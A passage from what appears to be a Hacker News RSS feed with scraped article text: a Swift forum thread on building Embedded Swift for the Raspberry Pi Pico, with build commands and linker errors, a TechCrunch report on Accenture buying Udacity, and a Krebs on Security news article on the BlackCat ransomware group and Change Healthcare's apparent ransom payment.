Apple? Amazon?) would fail due to an incompatible company DNA. Using a rocket analogy, Tesla already built the “first stage” of the rocket with the whole supply chain of Model 3 and its onboard computer and a persistent internet connection. The “second stage” would be a full self driving solution based on large-scale neural network training, which OpenAI expertise could significantly help accelerate. With a functioning full self-driving solution in ~2-3 years we could sell a lot of cars/trucks. If we do this really well, the transportation industry is large enough that we could increase Tesla's market cap to high O(~100K), and use that revenue to fund the AI work at the appropriate scale.</p><p>I cannot see anything else that has the potential to reach sustainable Google-scale capital within a decade.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Embedded Swift on the Raspberry Pi Pico (267 pts)]]></title>
            <link>https://forums.swift.org/t/embedded-swift-on-the-raspberry-pi-pico-rp2040-without-the-pico-sdk/69338</link>
            <guid>39611111</guid>
            <pubDate>Wed, 06 Mar 2024 01:10:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://forums.swift.org/t/embedded-swift-on-the-raspberry-pi-pico-rp2040-without-the-pico-sdk/69338">https://forums.swift.org/t/embedded-swift-on-the-raspberry-pi-pico-rp2040-without-the-pico-sdk/69338</a>, See on <a href="https://news.ycombinator.com/item?id=39611111">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
      <meta itemprop="headline" content="Embedded Swift on the Raspberry Pi Pico/RP2040 without the Pico SDK">
      
      <meta itemprop="datePublished" content="2024-01-08T20:12:02Z">
        <meta itemprop="articleSection" content="Community Showcase">
      <meta itemprop="keywords" content="embedded, rp-pico, rp2040">
      


          <div id="post_1">
            <div>
              

                

              <p><span>
                  <time datetime="2024-01-08T20:12:02Z">
                    January 8, 2024,  8:12pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-08T20:23:25Z">
              <span itemprop="position">1</span>
              </span>
            </p></div>
            <div itemprop="text">
              <p>This is sort of a follow-up on <a href="https://forums.swift.org/t/embedded-swift-running-on-the-raspberry-pi-pico/69001">Embedded Swift running on the Raspberry Pi Pico</a>, but with a different take.</p>
<p>I managed to create a very small Embedded Swift "toolchain" for building pure Swift executables for the Raspberry Pi Pico (it might also work with other RP2040 boards, but I'm only testing on the Pico). The "toolchain" is just a Makefile, so no SwiftPM integration yet, but I feel we're not too far off. The repository is here if you want to try it out:</p>


<p>It should work on macOS and Linux as hosts (tested with Ubuntu 22.04 via Docker). Please report back if you try this out and manage to get something running on a Pico.</p>
<p>Unlike our other approach (in <a href="https://forums.swift.org/t/embedded-swift-running-on-the-raspberry-pi-pico/69001">Embedded Swift running on the Raspberry Pi Pico</a>), this doesn't use the Raspberry Pi Pico C/C++ SDK as a basis, which has pros and cons:</p>
<ul>
<li>
<p>Much less build system complexity. This makes it much more feasible IMO to get it working with SwiftPM eventually. I found the complexity of the Pico SDK's CMake config very overwhelming. The Makefile we have here isn't pretty, but it's soooo much smaller.</p>
</li>
<li>
<p>We have to build everything from scratch, so almost nothing works yet. I wrote a few simple functions to talk to a GPIO pin (very ugly code currently), but that's it for now — we have no timers, no I²C, no SPI, etc.</p>
</li>
<li>
<p>This clean slate is also exciting, of course. Lots of room for experimentation and learning.</p>
</li>
</ul>
<p>The main application code is all Swift. There's very little C and Assembly involved for the bootstrapping. I copied the necessary files (linker script etc.) from the Pico SDK and patched them slightly. The bootstrapping code still does a few things we don't really need. I hope to make whittle it down to the bare minimum we need eventually, if only to understand it better.</p>
<p>I'm using the C compiler and linker from the <a href="https://github.com/ARM-software/LLVM-embedded-toolchain-for-Arm/" rel="noopener nofollow ugc">ARM Embedded LLVM toolchain</a>. If I'm reading <a href="https://forums.swift.org/u/kubamracek">@kubamracek</a> current work in the Swift repo correctly (e.g. <a href="https://github.com/apple/swift/pull/70715" rel="noopener nofollow ugc">[embedded] Start building and including lld even in Darwin toolchains by kubamracek · Pull Request #70715 · apple/swift · GitHub</a>), we may soon be able to use the Swift linker for this?</p>
<p>By the way, the current executable, which blinks an LED and listens to a GPIO input, is less than 1 KB:</p>
<pre data-code-wrap="sh"><code>/Applications/LLVMEmbeddedToolchainForArm-17.0.1-Darwin/bin/llvm-size SwiftPico.elf
   text	   data	    bss	    dec	    hex	filename
    992	      0	      0	    992	    3e0	SwiftPico.elf
</code></pre>
<p>The next step I'd love to take is SwiftPM integration as this would make it so much easier to integrate other packages. I started experimenting with building an <a href="https://github.com/apple/swift-evolution/blob/main/proposals/0387-cross-compilation-destinations.md" rel="noopener nofollow ugc">SE-0387</a>-style SDK for the RP-2040, but I haven't succeeded yet. I'll probably post questions in a separate thread.</p>
            </div>

            

            

                
          </div>
          <div id="post_2" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/Helge_Hess1"><span itemprop="name">Helge_Hess1</span></a>
                (Helge Heß)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-08T20:41:33Z">
                    January 8, 2024,  8:41pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-08T20:41:33Z">
              <span itemprop="position">2</span>
              </span>
            </p>
            <div itemprop="text">
              <p>I didn't play with the new 387 stuff yet (FP coprocessor support?), which is probably much better, but maybe my cross compiler sample might be helpful too: <a href="https://github.com/SPMDestinations" rel="noopener nofollow ugc">Swift Package Manager Cross Compilation Destinations · GitHub</a></p>
            </div>

            

            

          </div>
          <div id="post_3" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/kubamracek"><span itemprop="name">kubamracek</span></a>
                (Kuba Mracek)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-09T12:52:58Z">
                    January 9, 2024, 12:52pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-09T12:52:58Z">
              <span itemprop="position">3</span>
              </span>
            </p>
            <p>This is awesome work, <a href="https://forums.swift.org/u/ole">@ole</a>! <img src="https://emoji.discourse-cdn.com/apple/blush.png?v=12" title=":blush:" alt=":blush:" loading="lazy" width="20" height="20"></p>

            

            

          </div>
          <div id="post_4" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/flocked"><span itemprop="name">flocked</span></a>
                (Florian Zand)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-11T01:31:01Z">
                    January 11, 2024,  1:31am
                  </time>
                  <meta itemprop="dateModified" content="2024-01-11T01:33:12Z">
              <span itemprop="position">4</span>
              </span>
            </p>
            <p><a href="https://forums.swift.org/u/ole">@ole</a> Amazing work! So happy to see Swift running on embedded platforms. I love coding for them but I'm not the biggest fan of Arduino (thought they are doing amazing work!).</p>

            

            

          </div>
          <div id="post_5" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/Max_Desiatov"><span itemprop="name">Max_Desiatov</span></a>
                (Max Desiatov)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-11T09:55:26Z">
                    January 11, 2024,  9:55am
                  </time>
                  <meta itemprop="dateModified" content="2024-01-11T09:58:29Z">
              <span itemprop="position">5</span>
              </span>
            </p>
            <div itemprop="text">
              
<p>I'm not entirely convinced Swift SDKs are the right answer for embedded platforms. The primary reason to have a Swift SDK is a need for a special libc and dependencies like swift-corelibs-dispatch and swift-corelibs-xctest that are hard to build as a package. Another potential use case is the ability to define test runners and debuggers, but this latter possibility hasn't been explored yet.</p>
<p>Since you don't immediately need either of those in this case, if you can fit all the required platform things into a separate package it should be much easier for users to depend on it. That also makes it highly customizable and easy to update in one go, as opposed to adding an out-of-package Swift SDK dependency.</p>
<p>If you need to add unsafe compiler/linker flags to such "embedded platform support" package, please let us know. I hope we'll be able to work around or find fixes for those new requirements.</p>
            </div>

            

            

          </div>
          <div id="post_6" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/ole"><span itemprop="name">ole</span></a>
                (Ole Begemann)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-14T19:45:32Z">
                    January 14, 2024,  7:45pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-14T19:45:32Z">
              <span itemprop="position">6</span>
              </span>
            </p>
            <div itemprop="text">
              
<p>Thank you, Helge. I think I'd rather go with the new SDK approach (if it's necessary at all, see <a href="https://forums.swift.org/u/max_desiatov">@Max_Desiatov</a>'s <a href="https://forums.swift.org/t/embedded-swift-on-the-raspberry-pi-pico-rp2040-without-the-pico-sdk/69338/5">reply above</a>) because why not use the new stuff? I never used cross-compilation with <code>destination.json</code> so I think my time is better spent focusing on the new stuff. Both approaches seem very similar to me.</p>
            </div>

            

            

          </div>
          <div id="post_7" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/Helge_Hess1"><span itemprop="name">Helge_Hess1</span></a>
                (Helge Heß)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-14T20:15:37Z">
                    January 14, 2024,  8:15pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-14T20:15:37Z">
              <span itemprop="position">7</span>
              </span>
            </p>
            <p>Oh yes, absolutely use the new stuff!! As mentioned I haven't looked at it yet, I thought my stuff might be potentially helpful to build <em>upon</em> the new things.<br>
My things essentially streamline the work by <a href="https://forums.swift.org/u/johannesweiss">@johannesweiss</a> into distinct steps (getting a target toolchain and things like that).</p>

            

            

          </div>
          <div id="post_8" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/Helge_Hess1"><span itemprop="name">Helge_Hess1</span></a>
                (Helge Heß)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-14T20:17:21Z">
                    January 14, 2024,  8:17pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-14T20:17:21Z">
              <span itemprop="position">8</span>
              </span>
            </p>
            <p>Is there a good intro on the new things? E.g. how do Linux toolchains work?</p>

            

            

          </div>
          <div id="post_9" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/ole"><span itemprop="name">ole</span></a>
                (Ole Begemann)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-14T20:30:51Z">
                    January 14, 2024,  8:30pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-14T20:41:32Z">
              <span itemprop="position">9</span>
              </span>
            </p>
            <div itemprop="text">
              
<p>Interesting. I think a special libc <em>might</em> be interesting/necessary for some embedded environments. For example, the Pico C SDK does depend on an embedded libc AFAIK, but that's a topic for the other thread <a href="https://forums.swift.org/t/embedded-swift-running-on-the-raspberry-pi-pico/69001">Embedded Swift running on the Raspberry Pi Pico</a>. You're right that the from-scratch approach we're discussing in this thread doesn't need it.</p>

<p>That would be nice, although I fear the stuff we need to do for the RP2040 will be difficult to wrap in a package:</p>
<ul>
<li>The second-stage bootloader (boot2) is assembled and linked with a special linker script that puts it at the right location in flash</li>
<li>Then we calculate a checksum over the bootloader binary and write that checksum into the binary (the RP2040 won't boot unless this checksum is there). This is currently done by a Python script.</li>
<li>The runtime (crt0) for the main executable (setting up IRQ handlers, exception handlers etc.) is assembled and linked with the main executable</li>
<li>The main executable also needs to be linked with a special linker script</li>
</ul>
<p>Maybe the checksum calculation can be done in a SwiftPM plugin? But I'm not sure we can integrate this cleanly.</p>
<p>We can prebuild boot2 and crt0, but then we're also no longer talking about a simple package that you can include as a dependency, right (because of the binary files involved)? And it doesn't solve how to pass the linker script to the final link step.</p>

<p>I think my biggest problem in doing any SwiftPM experiments right now is that I can't use <code>swift</code> as the linker to build a Pico executable – I have to use Clang for linking. I don't think I can tell SwiftPM to link with Clang unless I build an SE-0387-style SDK?</p>
<p>Here are the errors I get when I try to link with Swift (on Linux; I understand linking ELF files on macOS is work in progress: <a href="https://github.com/apple/swift/pull/70715" rel="noopener nofollow ugc">[embedded] Start building and including lld even in Darwin toolchains by kubamracek · Pull Request #70715 · apple/swift · GitHub</a>):</p>
<pre data-code-wrap="sh"><code>/usr/bin/swift --version
Swift version 5.11-dev (LLVM 13124099c3f0229, Swift d6871edc839adec)
Target: aarch64-unknown-linux-gnu

"/usr/bin/swiftc" \
	-enable-experimental-feature Embedded \
	-target armv6m-none-none-eabi \
	-Xlinker --script=pico-sdk-comps/memmap_default.ld \
	-Xlinker -z -Xlinker max-page-size=4096 \
	-Xlinker --gc-sections \
	-Xlinker --wrap=__aeabi_lmul \
	build/bs2_default_padded_checksummed.S.obj build/crt0.S.obj build/bootrom.c.obj build/pico_int64_ops_aeabi.S.obj build/main.o \
	-o "build/SwiftPico.elf"
error: link command failed with exit code 1 (use -v to see invocation)
clang: error: no such file or directory: '/usr/lib/swift/armv6m/swiftrt.o'
error: fatalError
make: *** [Makefile:141: build/SwiftPico.elf] Error 1
</code></pre>
<p>OK, so it's looking for <code>/usr/lib/swift/armv6m/swiftrt.o</code> and doesn't find it. That directory doesn't exist. Should it exist? Will it exist in the future as the embedded toolchain improves?</p>
<p>Linking with <code>-nostartfiles</code> gets rid of that error, but produces more:</p>
<pre data-code-wrap="sh"><code>"/usr/bin/swiftc" \
	-enable-experimental-feature Embedded \
	-target armv6m-none-none-eabi \
	-nostartfiles \
	-Xlinker -nostdlib \
	-Xlinker --script=pico-sdk-comps/memmap_default.ld \
	-Xlinker -z -Xlinker max-page-size=4096 \
	-Xlinker --gc-sections \
	-Xlinker --wrap=__aeabi_lmul \
	build/bs2_default_padded_checksummed.S.obj build/crt0.S.obj build/bootrom.c.obj build/pico_int64_ops_aeabi.S.obj build/main.o \
	-o "build/SwiftPico.elf"
error: link command failed with exit code 1 (use -v to see invocation)
/usr/bin/ld.gold: error: cannot find -lswiftCore
/usr/bin/ld.gold: error: cannot find -lc
/usr/bin/ld.gold: error: cannot find -lm
/usr/bin/ld.gold: error: cannot find -lclang_rt.builtins-armv6m
/usr/bin/ld.gold: internal error in set_address, at ../../gold/output.h:322
clang: error: ld.lld command failed with exit code 1 (use -v to see invocation)
error: fatalError
make: *** [Makefile:142: build/SwiftPico.elf] Error 1
</code></pre>
<p>I'm afraid I don't really understand what I'm doing here, so it's hard to ask better questions.</p>
            </div>

            

            

          </div>
          <div id="post_10" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/ole"><span itemprop="name">ole</span></a>
                (Ole Begemann)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-14T20:38:42Z">
                    January 14, 2024,  8:38pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-14T20:38:42Z">
              <span itemprop="position">10</span>
              </span>
            </p>
            <div itemprop="text">
              
<p>I ran <a href="https://github.com/apple/swift-sdk-generator" rel="noopener nofollow ugc">GitHub - apple/swift-sdk-generator: Generate Swift SDKs for cross-compilation</a> with the default settings. It produced a working Mac-to-Linux cross-compilation SDK, i.e. I successfully used it to build a Linux binary on the Mac.</p>
<p>The JSON files in the generated <code>.artifactbundle</code> look a lot like <code>destination.json</code>:</p>
<details>
<p>xyx.artifactbundle/info.json:</p>
<pre data-code-wrap="json"><code>{
  "artifacts" : {
    "5.9.2-RELEASE_ubuntu_jammy_aarch64" : {
      "type" : "swiftSDK",
      "version" : "0.0.1",
      "variants" : [
        {
          "path" : "5.9.2-RELEASE_ubuntu_jammy_aarch64/aarch64-unknown-linux-gnu",
          "supportedTriples" : [
            "arm64-apple-macosx13.0"
          ]
        }
      ]
    }
  },
  "schemaVersion" : "1.0"
}
</code></pre>
<p>xyx.artifactbundle/5.9.2-RELEASE_ubuntu_jammy_aarch64/aarch64-unknown-linux-gnu/swift-sdk.json:</p>
<pre data-code-wrap="json"><code>{
  "targetTriples" : {
    "aarch64-unknown-linux-gnu" : {
      "sdkRootPath" : "ubuntu-jammy.sdk",
      "toolsetPaths" : [
        "toolset.json"
      ]
    }
  },
  "schemaVersion" : "4.0"
}
</code></pre>
<p>xyx.artifactbundle/5.9.2-RELEASE_ubuntu_jammy_aarch64/aarch64-unknown-linux-gnu/toolset.json:</p>
<pre data-code-wrap="json"><code>{
  "librarian" : {
    "path" : "llvm-ar"
  },
  "schemaVersion" : "1.0",
  "swiftCompiler" : {
    "extraCLIOptions" : [
      "-use-ld=lld",
      "-Xlinker",
      "-R/usr/lib/swift/linux/"
    ]
  },
  "cxxCompiler" : {
    "extraCLIOptions" : [
      "-lstdc++"
    ]
  },
  "linker" : {
    "path" : "ld.lld"
  },
  "rootPath" : "swift.xctoolchain/usr/bin"
}
</code></pre>
</details>
            </div>

            

            

          </div>
          <div id="post_11" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/Max_Desiatov"><span itemprop="name">Max_Desiatov</span></a>
                (Max Desiatov)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-14T21:27:10Z">
                    January 14, 2024,  9:27pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-14T21:27:10Z">
              <span itemprop="position">11</span>
              </span>
            </p>
            <div itemprop="text">
              
<p>This should be doable with a plugin. Maybe even the Python script can be packaged in an <code>.artifactbundle</code> and then called from the plugin? You can just pretend it's a "binary", by sticking an executable flag on it and adding an appropriate Python shebang header. IMO in SwiftPM we're too prescriptive in saying that package plugins must delegate to binary executables, any executable script should do, assuming an interpreter for it is available.</p>

<p>IIUC this can be done today with something like <code>LinkerSetting.unsafeFlags(["-T", "&lt;your_linker_script&gt;"])</code> passed to your target that needs it in <code>Package.swift</code>.</p>

<p>IIUC we're basically always delegate to Clang for linking anyway. Pass <code>-v</code> to your <code>swiftc</code> invocation to see that it invokes Clang under the hood.</p>

<p>It should not, this file is irrelevant in the embedded mode as of right now. There are apparently still Swift Driver bugs present, where unrelated non-embedded options are passed in the embedded mode. I've fixed some of them recently in <a href="https://github.com/apple/swift-driver/pull/1516">Don't pass `-rpath` and `-lswiftCore` in embedded mode by MaxDesiatov · Pull Request #1516 · apple/swift-driver · GitHub</a>, apparently there are more lurking out there in the codebase.</p>

<p>These also look like driver bugs to me, some of them possibly fixed by the PR I linked above.</p>
            </div>

            

            

          </div>
          <div id="post_12" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/ole"><span itemprop="name">ole</span></a>
                (Ole Begemann)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-15T17:06:42Z">
                    January 15, 2024,  5:06pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-15T17:06:42Z">
              <span itemprop="position">12</span>
              </span>
            </p>
            <div itemprop="text">
              <p>OK, I created a repo with a minimal SwiftPM package: just an executable product with an empty <code>main</code> method, not including any of the RP2040-specific stuff. Here's the repo: <a href="https://github.com/ole/SwiftPM-embedded-minimal" rel="noopener nofollow ugc">GitHub - ole/SwiftPM-embedded-minimal</a></p>
<p>Now I want to build this for Embedded (<code>armv6m-none-none-eabi</code> in my case). Depending on the configuration (Mac vs. Linux and debug vs. release), I'm getting different build errors. I have documented these in two issues:</p>
<ul>
<li><a href="https://github.com/ole/SwiftPM-embedded-minimal/issues/1" rel="noopener nofollow ugc">SwiftPM build failures on macOS · Issue #1 · ole/SwiftPM-embedded-minimal · GitHub</a></li>
<li><a href="https://github.com/ole/SwiftPM-embedded-minimal/issues/2" rel="noopener nofollow ugc">SwiftPM build failures on Linux · Issue #2 · ole/SwiftPM-embedded-minimal · GitHub</a></li>
</ul>
<p>I don't necessarily expect these builds to succeed as they are because the linker would certainly miss some required symbols. But the errors I'm seeing seem to occur at an earlier stage, and they're the same errors I'm seeing with my more complex RP2040-specific setup (incl. linker scripts etc.), which I pushed here: <a href="https://github.com/ole/swift-rp-pico-bare/pull/4" rel="noopener nofollow ugc">[WIP] Try to build with SwiftPM by ole · Pull Request #4 · ole/swift-rp-pico-bare · GitHub</a>.</p>
<p>Any help is appreciated.</p>
            </div>

            

            

          </div>
          <div id="post_13" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <div>
              <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/kebo"><span itemprop="name">kebo</span></a>
                (Kenta Kubo)
              </span></p>

              <p><span>
                  <time itemprop="datePublished" datetime="2024-01-15T17:41:10Z">
                    January 15, 2024,  5:41pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-15T18:05:15Z">
              <span itemprop="position">13</span>
              </span>
            </p></div>
            <div itemprop="text">
              <p>I have successfully used SwiftPM to build Swift sources to a static library and link it with other object files using lld. This is still a very small example, but I hope it is at least partially helpful for you.</p>


<p>(Note that swiftly cannot currently be used as is due to <a href="https://github.com/swift-server/swiftly/issues/92" rel="noopener nofollow ugc">this issue</a>)</p>
            </div>

            

            

          </div>
          <div id="post_14" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://forums.swift.org/u/ole"><span itemprop="name">ole</span></a>
                (Ole Begemann)
              </span>



              <span>
                  <time itemprop="datePublished" datetime="2024-01-15T19:26:13Z">
                    January 15, 2024,  7:26pm
                  </time>
                  <meta itemprop="dateModified" content="2024-01-15T19:26:13Z">
              <span itemprop="position">14</span>
              </span>
            </p>
            <div itemprop="text">
              
<p>Thank you <a href="https://forums.swift.org/u/kebo">@kebo</a>! And thanks for the link, I'll take a look.</p>
            </div>

            

            

          </div>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Accenture to Acquire Udacity (126 pts)]]></title>
            <link>https://techcrunch.com/2024/03/05/accenture-to-acquire-udacity-to-build-a-learning-platform-focused-on-ai/</link>
            <guid>39610931</guid>
            <pubDate>Wed, 06 Mar 2024 00:46:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2024/03/05/accenture-to-acquire-udacity-to-build-a-learning-platform-focused-on-ai/">https://techcrunch.com/2024/03/05/accenture-to-acquire-udacity-to-build-a-learning-platform-focused-on-ai/</a>, See on <a href="https://news.ycombinator.com/item?id=39610931">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Accenture announced today that it would acquire the <a href="https://newsroom.accenture.com/news/2024/accenture-to-acquire-edtech-leader-udacity-to-accelerate-capabilities-of-accenture-learnvantage" target="_blank" rel="noopener">learning platform Udacity</a> as part of an effort to build a learning platform focused on the growing interest in AI. While the company didn’t specify how much it paid for Udacity, it also announced a $1 billion investment in building a technology learning platform it’s calling LearnVantage.</p>
<p>While it could also offer more general technology training, the company made clear that it is particularly interested in offering training to get workers up to speed on AI. “The rise of generative AI represents one of the most transformative changes in how work gets done and is driving a growing need for enterprises to train and upskill people in cloud, data and AI as they build their digital core and reinvent their enterprises,” Kishore Durg, global lead of Accenture LearnVantage said in a statement.</p>
<p>As for Udacity, which was founded in 2011, it gave the usual kinds of statements a company makes when it gets acquired by a much larger organization like Accenture. That is, it believes that it can reach more people and help them acquire skills as part of the larger entity. That goes without saying, but there had been<a href="https://economictimes.indiatimes.com/tech/startups/upgrad-in-talks-for-100-million-to-close-us-edtech-udacity-buy/articleshow/106842130.cms?from=mdr" target="_blank" rel="noopener"> rumors earlier this year</a> that the company was in talks with Indian edtech company Upgrad with an asking price of $80 million. Apparently that deal fell through and Accenture ended up buying them instead.</p>
<p>Regardless, if the rumored $80 million price tag was correct, that was a precipitous drop in value for a company that raised almost $300 million, <a href="https://my.pitchbook.com/profile/54606-61/company/profile#general-info">per PitchBook</a>, and sported a $1 billion valuation in 2015.</p>
<p>Per usual, the deal is subject to regulatory review and antitrust oversight.</p>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[BlackCat ransomware group implodes after apparent payment by Change Healthcare (127 pts)]]></title>
            <link>https://krebsonsecurity.com/2024/03/blackcat-ransomware-group-implodes-after-apparent-22m-ransom-payment-by-change-healthcare/</link>
            <guid>39610846</guid>
            <pubDate>Wed, 06 Mar 2024 00:32:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://krebsonsecurity.com/2024/03/blackcat-ransomware-group-implodes-after-apparent-22m-ransom-payment-by-change-healthcare/">https://krebsonsecurity.com/2024/03/blackcat-ransomware-group-implodes-after-apparent-22m-ransom-payment-by-change-healthcare/</a>, See on <a href="https://news.ycombinator.com/item?id=39610846">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
												<p>There are indications that U.S. healthcare giant <strong>Change Healthcare</strong> has made a $22 million extortion payment to the infamous <strong>BlackCat</strong> ransomware group (a.k.a. “<strong>ALPHV</strong>“) as the company struggles to bring services back online amid a cyberattack that has disrupted prescription drug services nationwide for weeks. However, the cybercriminal who claims to have given BlackCat access to Change’s network says the crime gang cheated them out of their share of the ransom, and that they still have the sensitive data Change reportedly paid the group to destroy. Meanwhile, the affiliate’s disclosure appears to have prompted BlackCat to cease operations entirely.</p>
<div id="attachment_58289"><p><img aria-describedby="caption-attachment-58289" decoding="async" src="https://krebsonsecurity.com/wp-content/uploads/2022/01/blackcat.png" alt="" width="730" height="346"></p><p id="caption-attachment-58289">Image: Varonis.</p></div>
<p>In the third week of February, a cyber intrusion at Change Healthcare began shutting down important healthcare services as company systems were taken offline. It soon emerged that BlackCat was behind the attack, which has <a href="https://www.nytimes.com/2024/03/05/health/cyberattack-healthcare-cash.html" target="_blank" rel="noopener">disrupted the delivery of prescription drugs</a> for hospitals and pharmacies nationwide for nearly two weeks.</p>
<p>On March 1, a cryptocurrency address that security researchers had already mapped to BlackCat received a single transaction worth approximately $22 million. On March 3, a BlackCat affiliate posted a complaint to the exclusive Russian-language ransomware forum <strong>Ramp</strong> saying that Change Healthcare had paid a $22 million ransom for a decryption key, and to prevent four terabytes of stolen data from being published online.</p>
<p>The affiliate claimed BlackCat/ALPHV took the $22 million payment but never paid him his percentage of the ransom. BlackCat is known as a “ransomware-as-service” collective, meaning they rely on freelancers or affiliates to infect new networks with their ransomware. And those affiliates in turn earn commissions ranging from 60 to 90 percent of any ransom amount paid.</p>
<p>“But after receiving the payment ALPHV team decide to suspend our account and keep lying and delaying when we contacted ALPHV admin,” the affiliate “Notchy” wrote. “Sadly for Change Healthcare, their data [is] still with us.”</p>
<p>Change Healthcare has neither confirmed nor denied paying, and has responded to multiple media outlets with a similar non-denial statement — that the company is <a href="https://www.unitedhealthgroup.com/changehealthcarecyberresponse" target="_blank" rel="noopener">focused on its investigation and on restoring services</a>.</p>
<p>Assuming Change Healthcare did pay to keep their data from being published, that strategy seems to have gone awry: Notchy said the list of affected Change Healthcare partners they’d stolen sensitive data from included <strong>Medicare</strong> and a host of other major insurance and pharmacy networks.</p>
<p>On the bright side, Notchy’s complaint seems to have been the final nail in the coffin for the BlackCat ransomware group, which was <a href="https://krebsonsecurity.com/2023/12/blackcat-ransomware-raises-ante-after-fbi-disruption/" target="_blank" rel="noopener">infiltrated by the FBI and foreign law enforcement partners in late December 2023</a>. As part of that action, the government seized the BlackCat website and released a decryption tool to help victims recover their systems.</p>
<p>BlackCat responded by re-forming, and increasing affiliate commissions to as much as 90 percent. The ransomware group also declared it was formally removing any restrictions or discouragement against targeting hospitals and healthcare providers.</p>
<p>However, instead of responding that they would compensate and placate Notchy, a representative for BlackCat said today the group was shutting down and that it had already found a buyer for its ransomware source code.</p>
<div id="attachment_66615"><p><img aria-describedby="caption-attachment-66615" decoding="async" loading="lazy" src="https://krebsonsecurity.com/wp-content/uploads/2024/03/alphvseizureexit.png" alt="" width="751" height="384" srcset="https://krebsonsecurity.com/wp-content/uploads/2024/03/alphvseizureexit.png 1596w, https://krebsonsecurity.com/wp-content/uploads/2024/03/alphvseizureexit-768x393.png 768w, https://krebsonsecurity.com/wp-content/uploads/2024/03/alphvseizureexit-1536x786.png 1536w, https://krebsonsecurity.com/wp-content/uploads/2024/03/alphvseizureexit-782x400.png 782w" sizes="(max-width: 751px) 100vw, 751px"></p><p id="caption-attachment-66615">The seizure notice now displayed on the BlackCat darknet website.</p></div>
<p>“There’s no sense in making excuses,” wrote the RAMP member “Ransom.” “Yes, we knew about the problem, and we were trying to solve it. We told the affiliate to wait. We could send you our private chat logs where we are shocked by everything that’s happening and are trying to solve the issue with the transactions by using a higher fee, but there’s no sense in doing that because we decided to fully close the project. We can officially state that we got screwed by the feds.”<span id="more-66606"></span></p>
<p>BlackCat’s website now features a seizure notice from the FBI, but several researchers noted that this image seems to have been merely cut and pasted from the notice the FBI left in its December raid of BlackCat’s network. The FBI has not responded to requests for comment.</p>
<p><strong>Fabian Wosar</strong>, head of ransomware research at the security firm <strong>Emsisoft</strong>, said it appears BlackCat leaders are trying to pull an “exit scam” on affiliates by withholding many ransomware payment commissions at once and shutting down the service.</p>
<p>“ALPHV/BlackCat did not get seized,” Wosar wrote on Twitter/X today. “They are exit scamming their affiliates. It is blatantly obvious when you check the source code of their new takedown notice.”</p>
<p><strong>Dmitry Smilyanets</strong>, a researcher for the security firm Recorded Future, said BlackCat’s exit scam was especially dangerous because the affiliate still has all the stolen data, and could still demand additional payment or leak the information on his own.</p>
